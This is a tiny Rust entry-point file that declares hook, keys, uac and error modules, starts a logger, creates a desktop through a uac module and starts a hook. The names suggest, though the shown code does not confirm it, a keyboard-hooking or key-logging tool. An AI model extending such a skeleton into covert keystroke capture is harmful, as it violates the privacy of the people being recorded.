mod hook;
mod keys;
mod error;
mod uac;


fn main() 
{
   let _ = logger::StructLogger::new_default();
   uac::create_desktop();
   hook::start(); 
}
